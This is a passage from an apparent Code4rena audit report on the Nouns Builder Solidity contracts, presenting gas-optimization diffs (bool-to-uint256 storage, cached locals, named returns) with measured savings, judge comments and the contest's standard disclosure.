 78     :-        return operatorApprovals[_owner][_operator];\n+       78:+        return 1==operatorApprovals[_owner][_operator];\n    79,  79:     }\n    80,  80:\n    81,  81:     /// @notice The number of tokens owned\n@@ -102,7 +102,7 @@ abstract contract ERC721 is IERC721, Initializable {\n    102, 102:     function approve(address _to, uint256 _tokenId) external {\n    103, 103:         address owner = owners[_tokenId];\n    104, 104:\n- 105     :-        if (msg.sender != owner && !operatorApprovals[owner][msg.sender]) revert INVALID_APPROVAL();\n+      105:+        if (msg.sender != owner && 0==operatorApprovals[owner][msg.sender]) revert INVALID_APPROVAL();\n    106, 106:\n    107, 107:         tokenApprovals[_tokenId] = _to;\n    108, 108:\n@@ -113,7 +113,7 @@ abstract contract ERC721 is IERC721, Initializable {\n    113, 113:     /// @param _operator The account address\n    114, 114:     /// @param _approved If permission is being given or removed\n    115, 115:     function setApprovalForAll(address _operator, bool _approved) external {\n- 116     :-        operatorApprovals[msg.sender][_operator] = _approved;\n+      116:+        operatorApprovals[msg.sender][_operator] = _approved ? 1 : 0;\n    117, 117:\n    118, 118:         emit ApprovalForAll(msg.sender, _operator, _approved);\n    119, 119:     }\n@@ -131,7 +131,7 @@ abstract contract ERC721 is IERC721, Initializable {\n    131, 131:\n    132, 132:         if (_to == address(0)) revert ADDRESS_ZERO();\n    133, 133:\n- 134     :-        if (msg.sender != _from && !operatorApprovals[_from][msg.sender] && msg.sender != tokenApprovals[_tokenId]) revert INVALID_APPROVAL();\n+      134:+        if (msg.sender != _from && 0==operatorApprovals[_from][msg.sender] && msg.sender != tokenApprovals[_tokenId]) revert INVALID_APPROVAL();\n    135, 135:\n    136, 136:         _beforeTokenTransfer(_from, _to, _tokenId);\n    137, 137:\n```\n\n*   [src/lib/utils/Pausable.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/lib/utils/Pausable.sol)\n\n```diff\ndiff --git a/src/lib/utils/Pausable.sol b/src/lib/utils/Pausable.sol\nindex 6057d6b..5d37ad7 100644\n--- a/src/lib/utils/Pausable.sol\n+++ b/src/lib/utils/Pausable.sol\n@@ -12,7 +12,7 @@ abstract contract Pausable is IPausable, Initializable {\n    12,  12:     ///                                                          ///\n    13,  13:\n    14,  14:     /// @dev If the contract is paused\n-  15     :-    bool internal _paused;\n+       15:+    uint256 internal _paused;\n    16,  16:\n    17,  17:     ///                                                          ///\n    18,  18:     ///                           MODIFIERS                      ///\n@@ -20,13 +20,13 @@ abstract contract Pausable is IPausable, Initializable {\n    20,  20:\n    21,  21:     /// @dev Ensures the contract is paused\n    22,  22:     modifier whenPaused() {\n-  23     :-        if (!_paused) revert UNPAUSED();\n+       23:+        if (0==_paused) revert UNPAUSED();\n    24,  24:         _;\n    25,  25:     }\n    26,  26:\n    27,  27:     /// @dev Ensures the contract isn't paused\n    28,  28:     modifier whenNotPaused() {\n-  29     :-        if (_paused) revert PAUSED();\n+       29:+        if (1==_paused) revert PAUSED();\n    30,  30:         _;\n    31,  31:     }\n    32,  32:\n@@ -37,24 +37,24 @@ abstract contract Pausable is IPausable, Initializable {\n    37,  37:     /// @dev Sets whether the initial state\n    38,  38:     /// @param _initPause If the contract should pause upon initialization\n    39,  39:     function __Pausable_init(bool _initPause) internal onlyInitializing {\n-  40     :-        _paused = _initPause;\n+       40:+        _paused = _initPause ? 1 : 0;\n    41,  41:     }\n    42,  42:\n    43,  43:     /// @notice If the contract is paused\n    44,  44:     function paused() external view returns (bool) {\n-  45     :-        return _paused;\n+       45:+        return _paused == 1;\n    46,  46:     }\n    47,  47:\n    48,  48:     /// @dev Pauses the contract\n    49,  49:     function _pause() internal virtual whenNotPaused {\n-  50     :-        _paused = true;\n+       50:+        _paused = 1;\n    51,  51:\n    52,  52:         emit Paused(msg.sender);\n    53,  53:     }\n    54,  54:\n    55,  55:     /// @dev Unpauses the contract\n    56,  56:     function _unpause() internal virtual whenPaused {\n-  57     :-        _paused = false;\n+       57:+        _paused = 0;\n    58,  58:\n    59,  59:         emit Unpaused(msg.sender);\n    60,  60:     }\n```\n\n*   [src/manager/Manager.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/Manager.sol)\n*   [src/manager/storage/ManagerStorageV1.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/manager/storage/ManagerStorageV1.sol)\n\n```diff\ndiff --git a/src/manager/Manager.sol b/src/manager/Manager.sol\nindex d1025ec..5e2a230 100644\n--- a/src/manager/Manager.sol\n+++ b/src/manager/Manager.sol\n@@ -178,14 +178,14 @@ contract Manager is IManager, UUPS, Ownable, ManagerStorageV1 {\n    178, 178:     /// @param _baseImpl The base implementation address\n    179, 179:     /// @param _upgradeImpl The upgrade implementation address\n    180, 180:     function isRegisteredUpgrade(address _baseImpl, address _upgradeImpl) external view returns (bool) {\n- 181     :-        return isUpgrade[_baseImpl][_upgradeImpl];\n+      181:+        return 1==isUpgrade[_baseImpl][_upgradeImpl];\n    182, 182:     }\n    183, 183:\n    184, 184:     /// @notice Called by the Builder DAO to offer implementation upgrades for created DAOs\n    185, 185:     /// @param _baseImpl The base implementation address\n    186, 186:     /// @param _upgradeImpl The upgrade implementation address\n    187, 187:     function registerUpgrade(address _baseImpl, address _upgradeImpl) external onlyOwner {\n- 188     :-        isUpgrade[_baseImpl][_upgradeImpl] = true;\n+      188:+        isUpgrade[_baseImpl][_upgradeImpl] = 1;\n    189, 189:\n    190, 190:         emit UpgradeRegistered(_baseImpl, _upgradeImpl);\n    191, 191:     }\ndiff --git a/src/manager/storage/ManagerStorageV1.sol b/src/manager/storage/ManagerStorageV1.sol\nindex 5d981ef..e566821 100644\n--- a/src/manager/storage/ManagerStorageV1.sol\n+++ b/src/manager/storage/ManagerStorageV1.sol\n@@ -7,5 +7,5 @@ pragma solidity 0.8.15;\n    7,   7: contract ManagerStorageV1 {\n    8,   8:     /// @notice If a contract has been registered as an upgrade\n    9,   9:     /// @dev Base impl => Upgrade impl\n-  10     :-    mapping(address => mapping(address => bool)) internal isUpgrade;\n+       10:+    mapping(address => mapping(address => uint256)) internal isUpgrade;\n    11,  11: }\n```\n\n*   [src/token/metadata/MetadataRenderer.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/MetadataRenderer.sol)\n*   [src/token/metadata/types/MetadataRendererTypesV1.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/token/metadata/types/MetadataRendererTypesV1.sol)\n\n```diff\ndiff --git a/src/token/metadata/MetadataRenderer.sol b/src/token/metadata/MetadataRenderer.sol\nindex 7a140ec..7976581 100644\n--- a/src/token/metadata/MetadataRenderer.sol\n+++ b/src/token/metadata/MetadataRenderer.sol\n@@ -136,7 +136,7 @@ contract MetadataRenderer is IPropertyIPFSMetadataRenderer, UUPS, Ownable, Metad\n    136, 136:\n    137, 137:                 // Offset the id if the item is for a new property\n    138, 138:                 // Note: Property ids under the hood are offset by 1\n- 139     :-                if (_items[i].isNewProperty) {\n+      139:+                if (_items[i].isNewProperty == 1) {\n    140, 140:                     _propertyId += numStoredProperties;\n    141, 141:                 }\n    142, 142:\ndiff --git a/src/token/metadata/types/MetadataRendererTypesV1.sol b/src/token/metadata/types/MetadataRendererTypesV1.sol\nindex c0890f6..4a3146b 100644\n--- a/src/token/metadata/types/MetadataRendererTypesV1.sol\n+++ b/src/token/metadata/types/MetadataRendererTypesV1.sol\n@@ -8,7 +8,7 @@ interface MetadataRendererTypesV1 {\n    8,   8:     struct ItemParam {\n    9,   9:         uint256 propertyId;\n    10,  10:         string name;\n-  11     :-        bool isNewProperty;\n+       11:+        uint256 isNewProperty;\n    12,  12:     }\n    13,  13:\n    14,  14:     struct IPFSGroup {\n```\n\n## [G-05] Storage variable is used when local exists (2 instances)\n\nDeployment Gas Saved: **1 400**<br>\nMethod Call Gas Saved: **2 602**<br>\n`forge snapshot --diff`: **41 326** Gas Saved\n\n*   [src/auction/Auction.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/auction/Auction.sol)\n\nfunction: `_settleAuction`: `auction` cached in 169 but readed from storage in 172\n\n```diff\ndiff --git a/src/auction/Auction.sol b/src/auction/Auction.sol\nindex 794da99..3754f3b 100644\n--- a/src/auction/Auction.sol\n+++ b/src/auction/Auction.sol\n@@ -169,7 +169,7 @@ contract Auction is IAuction, UUPS, Ownable, ReentrancyGuard, Pausable, AuctionS\n169, 169:         Auction memory _auction = auction;\n170, 170:\n171, 171:         // Ensure the auction wasn't already settled\n- 172     :-        if (auction.settled) revert AUCTION_SETTLED();\n+      172:+        if (_auction.settled) revert AUCTION_SETTLED();\n173, 173:\n174, 174:         // Ensure the auction had started\n175, 175:         if (_auction.startTime == 0) revert AUCTION_NOT_STARTED();\n```\n\n*   [src/governance/governor/Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol)\n\n    function `propose`: `proposalThreshold()` cached in 123, but called again in 128\n\n```diff\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex 0d963c5..ce1ad1a 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -125,7 +125,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n125, 125:         // Cannot realistically underflow and `getVotes` would revert\n126, 126:         unchecked {\n127, 127:             // Ensure the caller's voting weight is greater than or equal to the threshold\n- 128     :-            if (getVotes(msg.sender, block.timestamp - 1) < proposalThreshold()) revert BELOW_PROPOSAL_THRESHOLD();\n+      128:+            if (getVotes(msg.sender, block.timestamp - 1) < currentProposalThreshold) revert BELOW_PROPOSAL_THRESHOLD();\n129, 129:         }\n130, 130:\n131, 131:         // Cache the number of targets\n```\n\n## [G-06] Use named returns where appropriate (3 instances)\n\nDeployment Gas Saved: **2 000**<br>\nMethod Call Gas Saved: **174**<br>\n`forge snapshot --diff`: **621** Gas Saved\n\n*   [src/governance/governor/Governor.sol](https://github.com/code-423n4/2022-09-nouns-builder/blob/main/src/governance/governor/Governor.sol)\n\n```diff\ndiff --git a/src/governance/governor/Governor.sol b/src/governance/governor/Governor.sol\nindex 0d963c5..200a72a 100644\n--- a/src/governance/governor/Governor.sol\n+++ b/src/governance/governor/Governor.sol\n@@ -118,7 +118,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n118, 118:         uint256[] memory _values,\n119, 119:         bytes[] memory _calldatas,\n120, 120:         string memory _description\n- 121     :-    ) external returns (bytes32) {\n+      121:+    ) external returns (bytes32 proposalId) {\n122, 122:         // Get the current proposal threshold\n123, 123:         uint256 currentProposalThreshold = proposalThreshold();\n124, 124:\n@@ -142,7 +142,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n142, 142:         bytes32 descriptionHash = keccak256(bytes(_description));\n143, 143:\n144, 144:         // Compute the proposal id\n- 145     :-        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);\n+      145:+        proposalId = hashProposal(_targets, _values, _calldatas, descriptionHash);\n146, 146:\n147, 147:         // Get the pointer to store the proposal\n148, 148:         Proposal storage proposal = proposals[proposalId];\n@@ -170,8 +170,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n170, 170:         proposal.timeCreated = uint32(block.timestamp);\n171, 171:\n172, 172:         emit ProposalCreated(proposalId, _targets, _values, _calldatas, _description, descriptionHash, proposal);\n- 173     :-\n- 174     :-        return proposalId;\n175, 173:     }\n176, 174:\n177, 175:     ///                                                          ///\n@@ -250,7 +248,7 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n250, 248:         address _voter,\n251, 249:         uint256 _support,\n252, 250:         string memory _reason\n- 253     :-    ) internal returns (uint256) {\n+      251:+    ) internal returns (uint256 weight) {\n254, 252:         // Ensure voting is active\n255, 253:         if (state(_proposalId) != ProposalState.Active) revert VOTING_NOT_STARTED();\n256, 254:\n@@ -266,9 +264,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n266, 264:         // Get the pointer to the proposal\n267, 265:         Proposal storage proposal = proposals[_proposalId];\n268, 266:\n- 269     :-        // Used to store the voter's weight\n- 270     :-        uint256 weight;\n- 271     :-\n272, 267:         // Cannot realistically underflow and `getVotes` would revert\n273, 268:         unchecked {\n274, 269:             // Get the voter's weight at the time the proposal was created\n@@ -292,8 +287,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n292, 287:         }\n293, 288:\n294, 289:         emit VoteCast(_voter, _proposalId, _support, weight, _reason);\n- 295     :-\n- 296     :-        return weight;\n297, 290:     }\n298, 291:\n299, 292:     ///                                                          ///\n@@ -326,9 +319,9 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n326, 319:         uint256[] calldata _values,\n327, 320:         bytes[] calldata _calldatas,\n328, 321:         bytes32 _descriptionHash\n- 329     :-    ) external payable returns (bytes32) {\n+      322:+    ) external payable returns (bytes32 proposalId) {\n330, 323:         // Get the proposal id\n- 331     :-        bytes32 proposalId = hashProposal(_targets, _values, _calldatas, _descriptionHash);\n+      324:+        proposalId = hashProposal(_targets, _values, _calldatas, _descriptionHash);\n332, 325:\n333, 326:         // Ensure the proposal is queued\n334, 327:         if (state(proposalId) != ProposalState.Queued) revert PROPOSAL_NOT_QUEUED(proposalId);\n@@ -340,8 +333,6 @@ contract Governor is IGovernor, UUPS, Ownable, EIP712, GovernorStorageV1 {\n340, 333:         settings.treasury.execute{ value: msg.value }(_targets, _values, _calldatas, _descriptionHash);\n341, 334:\n342, 335:         emit ProposalExecuted(proposalId);\n- 343     :-\n- 344     :-        return proposalId;\n345, 336:     }\n346, 337:\n347, 338:     ///                                                          ///\n```\n\n## Overall Gas Saved\n\nThis is the result of merging all the fixes:\n\nDeployment Gas Saved: **341 027**<br>\nMethod Call Gas Saved: **10 231**<br>\n`forge snapshot --diff`: **73 132** Gas Saved\n\n*Note: for complete details, please see warden's [full report](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133).*\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133#issuecomment-1250345793):**\n > This looks really good. 10k gas seems a little exaggerated but I will review in detail.\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2022-09-nouns-builder-findings/issues/133#issuecomment-1258618390):**\n > Math looks right, will reduce to 8000 gas as I have used heuristics for other reports.\n> \n> Best submission this contest, well done!\n\n\n\n***\n\n# Disclosures\n\nC4 is an open organization governed by participants in the community.\n\nC4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.\n\nC4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.\n"
}